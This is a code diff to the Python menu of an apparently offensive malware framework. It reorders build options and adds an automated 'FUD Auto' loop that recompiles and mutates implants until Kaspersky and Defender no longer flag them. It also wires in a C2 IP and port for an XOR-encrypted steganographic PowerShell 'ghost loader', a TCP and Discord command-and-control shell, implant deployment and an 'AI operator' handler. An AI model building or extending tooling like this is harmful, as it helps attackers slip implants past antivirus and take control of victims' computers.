@@ -196,12 +196,13 @@ def render():
     print(f"  {PINK}{BOLD}  PHASE 1 — BUILD{RST}")
     print(hline("─"))
     build_ops = [
-        ("X", "FUD Build",      "Metamorph + mutate + compile — evades AV/EDR", RED),
         ("F", "Fresh Build",    "Mutate + auto-IP + compile + scan", PINK),
+        ("X", "FUD Build",      "Metamorph + mutate + compile — evades AV/EDR", RED),
+        ("Z", "FUD Auto",       "Automated loop until Kaspersky CLEAN (ghost mode)", RED),
         ("1", "Compile Only",   "Build without mutation",            AMBER),
-        ("2", "Scan All",       "Defender check ALL binaries — run after EVERY build to verify FUD", RED),
-        ("4", "Mutate Keys",    "Rotate XOR keys + recompile",      AMBER),
-        ("6", "Key Status",     "Show current mutation keys",        AMBER),
+        ("4", "Mutate Keys",    "Rotate XOR keys + recompile",       AMBER),
+        ("6", "Key Status",     "Show current XOR mutation state",   AMBER),
+        ("2", "Scan All",       "Kaspersky + Defender — all binaries", RED),
     ]
     for key, name, desc, color in build_ops:
         print(f"  {color}  [{key}]{RST}  {WHITE}{name:<18s}{RST} {DIM}{desc}{RST}")
@@ -226,7 +227,6 @@ def render():
     print(f"  {RED}{BOLD}  PHASE 3 — DEPLOY{RST}")
     print(hline("─"))
     deploy_ops = [
-        ("D", "C2 Shell",       "TCP listener + Discord poller",     GREEN),
         ("B", "Build Implant",  "Sync token + rebuild + serve",      CYAN),
         ("A", "Auto Deploy",    "Compile + ship implant to target",  RED),
     ]
@@ -258,11 +258,12 @@ def render():
     print(f"  {BLUE}{BOLD}  TOOLKIT{RST}")
     print(hline("─"))
     toolkit_ops = [
+        ("G", "Ghost Encode",   "Steg payload + ghost_loader.exe",  CYAN),
+        ("D", "C2 Shell",       "TCP + Discord dual-channel C2",     GREEN),
         ("H", "HANDLER",        "AI operator — chat + tools",       PINK),
-        ("G", "Ghost Encode",   "Steganographic payload",            CYAN),
         ("5", "Pentest Chain",  "Full automated kill chain",         RED),
         ("W", "Web Dashboard",  "Browser C2 UI",                     BLUE),
-        ("X", "Convert Image",  "BMP/PNG/JPG auto-convert",         WHITE),
+        ("I", "Image Convert",  "BMP/PNG/JPG auto-convert",         WHITE),
         ("0", "Exit",           "",                                  DIM),
     ]
     for key, name, desc, color in toolkit_ops:
@@ -641,7 +642,15 @@ def run_op(choice):
             subprocess.run([sys.executable, auto_test], cwd=ROOT)
         else:
             print(f"\n  {RED}[!] auto_screenshot_test.py not found{RST}")
-    elif choice.lower() == "x":
+    elif choice.lower() == "z":
+        my_ip = detect_lan_ip() or "192.168.1.92"
+        print(f"\n  {RED}{BOLD}=== FUD AUTO LOOP — ghost mode ==={RST}")
+        print(f"  {DIM}  Ghost loader: XOR-encrypted zero-width steg PS1 — no shellcode patterns{RST}")
+        ip   = input(f"  {AMBER}C2 IP [{TEXT}{my_ip}{AMBER}]: {RST}").strip() or my_ip
+        port = prompt_port()
+        fud_auto = os.path.join(ROOT, "fud_auto.py")
+        subprocess.run([sys.executable, fud_auto, "ghost", ip, port, "--scan-only", "--max", "15"], cwd=ROOT)
+    elif choice.lower() == "i":
         convert_image()
     elif choice.lower() == "h":
         agent_script = os.path.join(ROOT, "cheyanne_agent.py")
